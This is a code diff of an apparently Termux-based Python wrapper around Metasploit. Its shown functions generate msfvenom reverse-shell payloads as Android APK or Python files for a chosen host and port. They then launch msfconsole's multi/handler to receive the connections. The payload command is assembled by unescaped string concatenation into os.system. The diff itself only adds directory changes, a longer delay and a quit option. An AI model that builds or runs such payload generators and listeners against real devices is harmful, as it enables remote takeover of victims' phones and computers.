@@ -7,8 +7,8 @@ from threading import Thread
 from Banner import *
 from random import choice
 from time import sleep
+from os import chdir
 import os
-
 def Checking_packge():
     os.system("clear")
     os.system("bash setup.sh")
@@ -67,13 +67,19 @@ def print_console(host,port,pay):
 
 def console(payload,host="127.0.0.1",port="4444"):
     print_console(host,port,payload)
-    sleep(4)
+    sleep(6)
     call(["msfconsole","-q","-x","use exploit/multi/handler;set lhost "+host+";set lport "+port+";set payload "+payload+";exploit;"])
 
 def Payload(payload,name,host,port):
+    sleep(1)
     print("[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
     P=col("P")
     N=col()
+    cd=pwd()
+    try:
+        chdir('/data/data/com.termux/files/home')
+    except:
+        pass
     if payload[:5] == "andro":
         name=name+".apk"
         print("{P}Apk file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
@@ -81,7 +87,7 @@ def Payload(payload,name,host,port):
         name=name+".py"
         print("{P}Python file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
     os.system("msfvenom -p "+payload+" lhost="+host+" lport="+port+" r"+">"+name)
-
+    chdir(cd)
 def banner1():
     print("""
  {G}------ Option ------{N}
@@ -151,6 +157,8 @@ def Load(Name="",List=List):
         if _inp_=="b":
             index()
             break
+        if _inp_ =="q":
+            raise SystemExit()
         if _inp_ != "":
             for i in List:
                 if str(i) == _inp_:
